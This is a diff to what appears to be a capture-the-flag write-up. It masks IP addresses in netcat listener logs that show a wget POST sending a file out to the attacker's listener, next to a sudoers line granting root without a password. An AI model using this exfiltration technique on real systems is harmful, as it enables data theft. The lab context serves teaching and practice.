@@ -72,12 +72,12 @@ On the netcat listener, we get the content of the file.
 
 ```
 listening on [any] 1234 ...
-connect to [10.9.0.11] from (UNKNOWN) [10.10.51.225] 58384
+connect to [xx.x.x.xx] from (UNKNOWN) [xx.xx.xxx.xx] 58384
 POST / HTTP/1.1
 User-Agent: Wget/1.17.1 (linux-gnu)
 Accept: */*
 Accept-Encoding: identity
-Host: 10.9.0.11:1234
+Host: xx.x.x.xx:1234
 Connection: Keep-Alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 797
@@ -129,12 +129,12 @@ jessie  ALL=(root) NOPASSWD: ALL
 We also need to remove this part.  
 ```
 listening on [any] 1234 ...
-connect to [10.9.0.11] from (UNKNOWN) [10.10.51.225] 58384
+connect to [xx.x.x.xx] from (UNKNOWN) [xx.xx.xxx.xx] 58384
 POST / HTTP/1.1
 User-Agent: Wget/1.17.1 (linux-gnu)
 Accept: */*
 Accept-Encoding: identity
-Host: 10.9.0.11:1234
+Host: xx.x.x.xx:1234
 Connection: Keep-Alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 797
